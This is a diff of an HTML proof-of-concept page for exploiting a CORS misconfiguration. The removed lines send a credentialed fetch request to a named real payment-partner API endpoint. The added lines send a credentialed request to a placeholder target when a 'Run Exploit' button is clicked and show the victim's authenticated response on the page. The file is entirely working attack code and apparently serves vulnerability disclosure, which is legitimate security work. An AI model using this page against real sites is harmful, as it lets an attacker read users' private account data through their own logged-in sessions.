@@ -1,21 +1,29 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <title>CORS PoC Exploit</title>
+  </head>
   <body>
-    <h2>PoC: CORS Misconfig</h2>
+    <h1>Proof of Concept - CORS Exploit</h1>
+    <button onclick="exploit()">Run Exploit</button>
+
+    <pre id="output"></pre>
+
     <script>
-      fetch("https://partner-api.alipayplus.com/api/aplus/applySupport.json", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({ test: "123" })
-      })
-        .then(res => res.text())
-        .then(data => {
-          document.body.innerHTML += "<pre>Response:<br>" + data + "</pre>";
+      function exploit() {
+        fetch("https://TARGET-VULNERABLE-SITE.com/api/endpoint", {
+          method: "GET",
+          credentials: "include"
         })
-        .catch(e => console.error(e));
+        .then(response => response.text())
+        .then(data => {
+          document.getElementById("output").textContent = data;
+        })
+        .catch(error => {
+          document.getElementById("output").textContent = "Error: " + error;
+        });
+      }
     </script>
   </body>
 </html>
+
